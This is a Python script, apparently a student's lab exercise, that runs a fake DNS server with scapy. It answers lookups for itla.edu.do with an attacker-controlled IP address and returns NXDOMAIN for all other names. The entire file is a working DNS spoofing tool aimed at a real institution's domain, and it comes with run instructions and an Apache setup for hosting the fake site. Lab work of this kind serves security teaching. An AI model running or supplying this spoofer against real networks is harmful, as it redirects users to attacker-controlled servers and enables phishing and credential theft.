#!/usr/bin/env python3
# ============================================================
# DNS Spoofing Attack Script
# Autor: Yeury Lopez | Matricula: 2025-0780
# Descripcion: Servidor DNS falso - spoof itla.edu.do
# Requisitos: pip3 install scapy, sudo apt install apache2
# Uso: sudo python3 dns_spoof.py
# ============================================================

from scapy.all import *
import socket
import threading

conf.verb = 0

IFACE    = "eth0"
FAKE_IP  = "172.20.25.100"
PORT     = 53
SPOOF_DOMAINS = {
    "itla.edu.do": FAKE_IP,
    "www.itla.edu.do": FAKE_IP,
}

def handle_dns(data, addr, sock):
    try:
        request = DNS(data)
        if request.qr == 0:
            qname = request.qd.qname.decode().rstrip('.')
            print(f"[*] Consulta recibida de {addr[0]}: {qname}")

            fake_ip = None
            for domain, ip in SPOOF_DOMAINS.items():
                if domain in qname:
                    fake_ip = ip
                    break

            if fake_ip:
                print(f"[+] Spoofing {qname} -> {fake_ip}")
                response = DNS(
                    id=request.id,
                    qr=1,
                    aa=1,
                    rd=1,
                    ra=1,
                    qd=request.qd,
                    an=DNSRR(
                        rrname=request.qd.qname,
                        ttl=10,
                        rdata=fake_ip
                    )
                )
            else:
                print(f"[-] Dominio no spoofed: {qname} -> NXDOMAIN")
                response = DNS(
                    id=request.id,
                    qr=1,
                    aa=1,
                    rd=1,
                    ra=1,
                    rcode=3,
                    qd=request.qd
                )

            sock.sendto(bytes(response), addr)
    except Exception as e:
        print(f"[!] Error: {e}")

def start_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', PORT))
    print(f"[*] Escuchando en puerto {PORT}...")

    while True:
        data, addr = sock.recvfrom(512)
        thread = threading.Thread(target=handle_dns, args=(data, addr, sock))
        thread.start()

if __name__ == "__main__":
    print("=" * 55)
    print("  DNS Spoofing | Yeury Lopez | 2025-0780")
    print("=" * 55)
    print(f"  Interfaz  : {IFACE}")
    print(f"  Fake IP   : {FAKE_IP}")
    print(f"  Dominio   : itla.edu.do -> {FAKE_IP}")
    print("=" * 55)
    print()

    try:
        start_server()
    except KeyboardInterrupt:
        print("\n[*] Servidor DNS falso detenido")
        print("=" * 55)
